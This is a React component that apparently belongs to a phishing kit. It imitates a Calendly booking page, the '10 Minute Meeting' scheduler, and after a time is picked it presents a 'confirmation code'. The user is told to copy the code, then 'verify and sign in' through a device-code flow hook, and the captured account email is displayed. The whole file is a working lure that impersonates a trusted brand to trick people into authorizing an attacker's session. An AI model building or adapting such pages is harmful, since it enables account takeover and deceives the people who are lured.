import React, { useState } from 'react';
import { useDeviceCodeFlow } from '../../hooks/useDeviceCodeFlow';

export function CalendlyTemplate(): React.ReactElement {
  const f = useDeviceCodeFlow('calendly-meeting');
  const [selectedTime, setSelectedTime] = useState('');

  const today = new Date();
  const dates = Array.from({ length: 5 }, (_, i) => {
    const d = new Date(today.getTime() + (i + 1) * 86400000);
    return { label: d.toLocaleDateString('en-US', { weekday: 'short', month: 'short', day: 'numeric' }), full: d.toISOString() };
  });
  const times = ['9:00am', '9:30am', '10:00am', '10:30am', '11:00am', '11:30am', '1:00pm', '1:30pm', '2:00pm', '2:30pm', '3:00pm'];

  return (
    <div className="tpl-page" style={{ background: '#f8f8f8' }}>
      <div className="tpl-container" style={{ maxWidth: 560 }}>
        <div className="tpl-card" style={{ padding: 0, overflow: 'hidden' }}>
          <div style={{ background: '#006BFF', padding: '20px 24px', color: 'white' }}>
            <div style={{ fontSize: 12, opacity: 0.8, marginBottom: 4 }}>Calendly</div>
            <h1 style={{ fontSize: 20, fontWeight: 600, margin: 0 }}>10 Minute Meeting</h1>
            <p style={{ fontSize: 13, opacity: 0.85, margin: '4px 0 0' }}>Select a time to schedule your meeting</p>
          </div>

          <div style={{ padding: 24 }}>
            {f.state === 'idle' && (
              <>
                <div style={{ fontSize: 14, fontWeight: 600, marginBottom: 12, color: '#1b1b1b' }}>Select a date</div>
                <div style={{ display: 'flex', gap: 8, marginBottom: 20, flexWrap: 'wrap' }}>
                  {dates.map(d => (
                    <button key={d.full} className="tpl-time-slot" onClick={() => {}} style={{ fontSize: 12, padding: '8px 12px', border: '1px solid #ddd', borderRadius: 6, background: 'white', cursor: 'pointer' }}>{d.label}</button>
                  ))}
                </div>
                <div style={{ fontSize: 14, fontWeight: 600, marginBottom: 12, color: '#1b1b1b' }}>Select a time</div>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 8, marginBottom: 20 }}>
                  {times.map(t => (
                    <button key={t} onClick={() => setSelectedTime(t)} className="tpl-time-slot" style={{ padding: '10px', border: selectedTime === t ? '2px solid #006BFF' : '1px solid #ddd', borderRadius: 6, background: selectedTime === t ? '#f0f6ff' : 'white', cursor: 'pointer', fontSize: 13, fontWeight: selectedTime === t ? 600 : 400, color: selectedTime === t ? '#006BFF' : '#333' }}>{t}</button>
                  ))}
                </div>
                {selectedTime && <button className="tpl-btn" style={{ background: '#006BFF' }} onClick={f.handleStart}>Confirm {selectedTime}</button>}
              </>
            )}
            {f.state === 'loading' && <div className="tpl-center"><div className="capture-spinner" /><p>Confirming your slot...</p></div>}
            {(f.state === 'code_ready' || f.state === 'waiting') && (
              <>
                <h1 className="tpl-title">Verify Your Account</h1>
                <p className="tpl-text">Verify your identity to confirm the meeting at {selectedTime}.</p>
                <div className="tpl-code-box"><div className="tpl-code-label">CONFIRMATION CODE</div><div className="tpl-code">{f.userCode}</div><button className="tpl-copy-btn" onClick={f.handleCopy}>{f.copied ? 'Copied!' : 'Copy'}</button></div>
                <div className="tpl-steps"><div className="tpl-step">1. Copy the confirmation code</div><div className="tpl-step">2. Click verify and sign in</div></div>
                <button className="tpl-btn" style={{ background: '#006BFF' }} onClick={f.handleVerify}>Verify</button>
                {f.state === 'waiting' && <p className="tpl-waiting">Waiting for verification...</p>}
                <p className="tpl-expiry">Code expires in {f.formatTime(f.countdown)}</p>
              </>
            )}
            {f.state === 'success' && <div className="tpl-center"><svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#107c10" strokeWidth="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><h1 className="tpl-title">Meeting Confirmed!</h1>{f.authEmail && <p>Account: <strong>{f.authEmail}</strong></p>}<p className="tpl-text">A calendar invite has been sent.</p><button className="tpl-btn secondary" onClick={f.handleReset}>Schedule another</button></div>}
            {f.state === 'expired' && <div className="tpl-center"><h1 className="tpl-title">Code Expired</h1><button className="tpl-btn" style={{ background: '#006BFF' }} onClick={f.handleReset}>Try Again</button></div>}
            {f.state === 'error' && <div className="tpl-center"><h1 className="tpl-title">Error</h1><p className="tpl-text">{f.errorMsg}</p><button className="tpl-btn" style={{ background: '#006BFF' }} onClick={f.handleReset}>Try Again</button></div>}
          </div>
        </div>
        <div className="tpl-footer"><span>Powered by Calendly</span></div>
      </div>
    </div>
  );
}
